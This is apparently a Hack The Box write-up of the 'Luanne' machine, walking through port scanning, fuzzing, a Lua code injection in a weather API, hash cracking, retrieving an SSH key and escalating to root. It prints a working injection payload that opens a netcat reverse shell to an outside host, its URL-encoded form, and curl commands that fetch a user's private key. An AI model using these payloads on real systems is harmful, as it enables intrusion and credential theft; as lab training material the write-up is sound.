---
layout: page
title: Luanne
description: Write-up
dropdown: HTB-BOXES
priority: 1
---
# Luanne Walkthrough
![](https://i.ibb.co/wJw8Kzj/image.png)



# []()Methodology

* Nmap scan.
* Web enumertation.
* Lua code injection vulnerability.
* Getting reverse shell.
* Enumerate luanne.
* Getting id_rsa for a user.
* ssh connecting.
* Privilege escalation.
* RooTed.

## Nmap Scan:

**I Found 3 ports opened 22,80,9001.** 

![](https://i.ibb.co/xXfkxYT/image.png)


### Let's start with the Web Page:

![](https://i.ibb.co/1GYkMLC/image.png)

> **It has authentication pop-up.**

> **I Tried admin:admin and other random credentials but no thing fine to login.**

> **But i noticed that when i got (401 Unauthorized) that is a localhost web page at port 3000.**

![](https://i.ibb.co/87bbn0b/image.png)


> #### I used ffuf for fuzzing luanne.htb/


![](https://i.ibb.co/bdWykc8/image.png)



* We got robots.txt

![](https://i.ibb.co/mTQCjQq/image.png)

* /weather disallowd with comment: still harversting cities.

* access to luanne.htb/weather 404 not found.

* but there are cities we had to find them.

* let's fire up ffuf again to fuzz luanne.htb/weather/ 

![](https://i.ibb.co/R2pH0fq/image.png)

**Nice got forecast**

> * by visiting luanne.htb/weather/forecast/ got this.


![](https://i.ibb.co/cJXyHr9/image.png)


> #### Use city=list to list available cities 

*okay, Thanks*


![](https://i.ibb.co/g7bGCMX/image.png)

* It's just a weather statues for every city, I stucked here and got hint from HTB fourms. 

![](https://i.ibb.co/dgQVN9S/image.png)

**Lua web application vulnerable to code injection by add a missing round brackets().**

* to get the shell we have to know the operating system and it's netBSD.
* by addind the missing round bracket to the shell.

```ruby
');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 1234 >/tmp/f")—
``` 
**encode the url**
```ruby
http://luanne.htb/weather/forecast?city=%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.6%201234%20%3E%2Ftmp%2Ff%22%29--
```
## Getting reverse shell.

![](https://i.ibb.co/1JXzdwC/image.png)

```html
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```
* added to luanneWepApi.txt 

> **we have to crack this hash, so Used john to crack it**

![](https://i.ibb.co/C854hrM/image.png)

**we got iamthebest**

## Enumerate luanne.


![](https://i.ibb.co/8M8vYqx/image.png)

> * We got user r.michaels 

**Let's check the netstate** 

![](https://i.ibb.co/pLd3JPM/image.png)

> * There is a localhost web page on port 3000 and 3001. 

**Let's Dig more**

![](https://i.ibb.co/r00s2W3/image.png)


![](https://i.ibb.co/HTDXSZx/image.png)

**I got hinted to dig more in port 3001 and get id_rsa.**

**So let's Try to curl the local web server in port 3001.**
```html
curl 127.0.0.1:3001/~r.michaels/.ssh/id_rsa
``` 

![](https://i.ibb.co/TYT9362/image.png)

> **no items here so we can find it in /~r.michaels/id_rsa ,Because we enterted launne as _httpd so this folder shared through web that's why we found id_rsa in /~r.michaels/ not in /~r.michaels/.ssh/**


![](https://i.ibb.co/fQpQGwW/image.png)

> **No Authorization, So let's login with "iamthebest"** 

```html
curl - -user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa
```

![](https://i.ibb.co/9V7NPZF/image.png)


## SSH connecting.


![](https://i.ibb.co/xm3Dh9Z/image.png)

![](https://i.ibb.co/L1GYvVN/image.png)

> **WE will use netpgp to decrypt devel_backup-2020-09-16.tar.gz.enc**

![](https://i.ibb.co/QmmzY8b/image.png)

> * we access to /webapi but no thing useful.


![](https://i.ibb.co/hKqcSJL/image.png)

> **we access to /www and got another webapi_user.**
 
![](https://i.ibb.co/D8f6St8/image.png)

* webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.


#### As before we will use john to crack it.

> **we got"littlebear"**

**by switching to superuser permissions using sudo su...**

![](https://i.ibb.co/VjZxr3m/image.png)

##### Command Not Found!!!

> **we had to find Alternatives for sudo su in netBSD operating system.**

* I found doas su, And that's ok.
* Surely we will use littlebear to get root.


![](https://i.ibb.co/5xQ1GY7/image.png)

# RooTed

<img src="http://www.hackthebox.eu/badge/image/209461" alt="Hack The Box">

